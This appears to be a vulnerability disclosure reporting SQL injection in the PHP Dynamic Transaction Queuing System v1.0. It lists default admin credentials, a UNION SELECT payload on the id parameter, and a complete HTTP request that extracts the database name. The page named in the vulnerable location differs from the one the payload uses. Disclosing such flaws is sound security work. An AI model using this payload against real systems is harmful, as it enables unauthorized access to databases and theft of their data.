# Dynamic Transaction Queuing System v1.0 by oretnom23 has SQL injection

BUG_Author: Grace

Login account: admin/admin123 (Super Admin account)

vendors: https://www.sourcecodester.com/php/14479/dynamic-transaction-queuing-system-using-phpmysql-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File:  /queuing/index.php?page=display&id=

Vulnerability location: /queuing/index.php?page=display&id=, id

dbname =queuing_db

[+] Payload: /queuing/index.php?page=queue_print&id=-1%20union%20select%201,database(),3,4,5,6,7,8,9--+ // Leak place ---> id

```sql
GET /queuing/index.php?page=queue_print&id=-1%20union%20select%201,database(),3,4,5,6,7,8,9--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=t4551shae3529036q2g0j8luub
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/200096558-bc446ad7-5a42-493c-aa3d-415f5e6208b5.png)
